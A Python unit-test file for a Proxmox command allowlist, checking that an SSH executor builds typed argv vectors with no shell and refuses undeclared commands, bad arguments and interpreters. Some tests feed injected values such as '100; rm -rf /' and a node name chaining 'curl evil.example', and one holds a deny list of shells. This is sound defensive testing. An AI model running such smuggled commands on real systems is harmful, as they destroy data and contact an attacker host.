"""The closed set of commands an executor may run on a node, and nothing else.

Some Proxmox operations exist only at the CLI. Reaching them means something,
somewhere, holds an SSH identity — and Article IV forbids that something being
the agent. So the identity lives in a separate executor, and what protects the
cluster is not the executor's own care but this: a closed list of commands, each
with typed arguments, assembled as an argv vector that never passes through a
shell.

The properties that matter are all about what cannot happen:

**A command nobody declared cannot run.** Not "is discouraged" — has no entry,
so there is nothing to build an argv from.

**An argument cannot become a command.** Every value is validated against its
own pattern before it is placed, and the result is a list rather than a string:
there is no shell to interpret a semicolon even if one survived validation.

**A write is labelled a write.** The autonomy layer decides whether an
unattended agent may run one, and it can only decide that if the declaration
says which kind it is.
"""

from __future__ import annotations

import pytest

from integrations.proxmox.commands import (
    COMMANDS,
    CommandRefused,
    argv_for,
    declaration_for,
)

pytestmark = pytest.mark.unit


def test_a_command_nobody_declared_has_nothing_to_build() -> None:
    with pytest.raises(CommandRefused):
        argv_for("rm-rf-everything", node="pve01", arguments={})


def test_a_declared_read_builds_the_vector_it_declares() -> None:
    assert argv_for("failed-units", node="pve01", arguments={}) == [
        "systemctl",
        "list-units",
        "--state=failed",
        "--no-legend",
        "--no-pager",
    ]


def test_an_argument_is_placed_rather_than_interpolated() -> None:
    found = argv_for("guest-status", node="pve01", arguments={"vmid": "100"})

    # A vector, so nothing between the elements is ever parsed by anything.
    assert found == ["pvesh", "get", "/nodes/pve01/lxc/100/status/current"]
    assert all(isinstance(part, str) for part in found)


def test_a_value_that_is_not_what_it_claims_is_refused() -> None:
    """The refusal is the point: the alternative is a vmid carrying a subshell."""
    with pytest.raises(CommandRefused):
        argv_for("guest-status", node="pve01", arguments={"vmid": "100; rm -rf /"})


def test_a_node_name_is_validated_the_same_way() -> None:
    with pytest.raises(CommandRefused):
        argv_for("failed-units", node="pve01 && curl evil.example", arguments={})


def test_an_argument_the_declaration_does_not_take_is_refused() -> None:
    """Not ignored: an argument nobody reads is a caller who believes something
    about this call that is not true."""
    with pytest.raises(CommandRefused):
        argv_for("failed-units", node="pve01", arguments={"vmid": "100"})


def test_a_required_argument_that_is_missing_is_refused() -> None:
    with pytest.raises(CommandRefused):
        argv_for("guest-status", node="pve01", arguments={})


def test_every_declared_command_says_whether_it_writes() -> None:
    """The autonomy layer gates unattended writes, and can only do that if the
    declaration says which kind each one is."""
    assert all(isinstance(entry.writes, bool) for entry in COMMANDS)


def test_the_read_only_commands_really_are_reads() -> None:
    """A command labelled a read that changes something is the one mislabelling
    that matters: it would run unattended."""
    reads = {entry.command_id for entry in COMMANDS if not entry.writes}

    assert "failed-units" in reads
    assert "guest-status" in reads
    assert "thin-pool-metadata" in reads


def test_a_declaration_carries_the_sentence_explaining_why_it_exists() -> None:
    """Every entry is an authority somebody granted; an entry nobody can justify
    is one that should not have been added."""
    assert all(entry.reason.strip() for entry in COMMANDS)


def test_no_declared_command_reaches_a_shell() -> None:
    """The structural guarantee. A vector is only safe while nothing in it is an
    interpreter that would take the rest as script."""
    forbidden = {"sh", "bash", "zsh", "dash", "eval", "ssh", "perl", "python", "python3"}

    assert not any(entry.argv[0] in forbidden for entry in COMMANDS)


def test_every_command_id_is_distinct() -> None:
    assert len({entry.command_id for entry in COMMANDS}) == len(COMMANDS)


def test_a_declaration_can_be_looked_up_by_its_identifier() -> None:
    assert declaration_for("failed-units").command_id == "failed-units"
    with pytest.raises(CommandRefused):
        declaration_for("nothing-like-this")


def test_a_command_taking_no_arguments_needs_none_passed() -> None:
    """The default is exercised nowhere else, and a function default built with
    `field()` is a dataclass sentinel rather than a mapping."""
    assert argv_for("quorum-status", node="pve01") == ["pvecm", "status"]
